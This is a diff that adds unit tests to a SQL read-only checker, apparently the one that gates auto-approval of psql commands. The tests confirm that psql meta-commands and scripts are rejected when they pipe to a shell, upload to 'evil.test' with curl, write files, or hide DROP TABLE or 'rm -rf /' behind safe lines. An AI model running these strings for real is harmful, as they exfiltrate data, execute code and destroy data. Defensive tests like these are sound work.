@@ -401,3 +401,88 @@ describe("isStatementReadOnly (direct)", () => {
     expect(isStatementReadOnly({ type: "with", bind: null, in: { type: "select" } })).toBe(false)
   })
 })
+
+describe("meta-commands that write when given an operand", () => {
+  // \g and \s are read-only bare, but their optional operand redirects
+  // output to a file or a shell pipeline. They used to be unconditionally
+  // safe, so `psql -c '\g | sh'` was auto-approved.
+  const dangerous = [
+    "\\g | sh",
+    "\\g /tmp/pwned.txt",
+    "\\g |curl -T - https://evil.test",
+    "\\s /tmp/history.txt",
+  ]
+
+  for (const sql of dangerous) {
+    test(`rejects ${sql}`, () => {
+      expect(isSqlReadOnly(sql)).toBe(false)
+    })
+  }
+
+  const safe = ["\\g", "\\s", "  \\g  "]
+
+  for (const sql of safe) {
+    test(`allows bare ${JSON.stringify(sql)}`, () => {
+      expect(isSqlReadOnly(sql)).toBe(true)
+    })
+  }
+})
+
+describe("editor meta-commands are no longer safe", () => {
+  // \ef / \ev open $EDITOR and execute the buffer on save. They were
+  // allowed on the reasoning that `-c` context makes them inert, which
+  // stops being true for scripts arriving any other way.
+  for (const sql of ["\\ef myfunc", "\\ev myview", "\\ef"]) {
+    test(`rejects ${sql}`, () => {
+      expect(isSqlReadOnly(sql)).toBe(false)
+    })
+  }
+})
+
+describe("scripts mixing meta-commands with SQL", () => {
+  // The checker used to branch on the first character of the whole blob
+  // and hand all of it to one checker, so a leading safe meta-command
+  // carried everything after it.
+  test("rejects a write hiding behind a leading \\dt", () => {
+    expect(isSqlReadOnly("\\dt\nDROP TABLE users;")).toBe(false)
+  })
+
+  test("rejects a write hiding behind a leading \\echo", () => {
+    expect(isSqlReadOnly("\\echo hi\nDROP TABLE users;")).toBe(false)
+  })
+
+  test("rejects a write between two safe meta-commands", () => {
+    expect(isSqlReadOnly("\\echo a\nDELETE FROM t;\n\\echo b")).toBe(false)
+  })
+
+  test("rejects a dangerous meta-command after read-only SQL", () => {
+    expect(isSqlReadOnly("select 1;\n\\! rm -rf /")).toBe(false)
+  })
+
+  test("rejects a write hiding behind a leading .tables", () => {
+    expect(isSqlReadOnly(".tables\nDROP TABLE users;")).toBe(false)
+  })
+
+  test("allows meta-commands interleaved with selects", () => {
+    const script = [
+      "\\echo === section one ===",
+      "select a from t where x ilike '%foo%';",
+      "\\echo === section two ===",
+      "select max(b) from t;",
+    ].join("\n")
+    expect(isSqlReadOnly(script)).toBe(true)
+  })
+
+  test("allows a multi-line statement split across lines", () => {
+    const script = "select a,\n       b\n  from t\n where a > 1;"
+    expect(isSqlReadOnly(script)).toBe(true)
+  })
+
+  test("allows blank lines between statements", () => {
+    expect(isSqlReadOnly("\\dt\n\nselect 1;\n\n")).toBe(true)
+  })
+
+  test("rejects a second statement that writes", () => {
+    expect(isSqlReadOnly("select 1;\nselect 2;\nUPDATE t SET a = 1;")).toBe(false)
+  })
+})
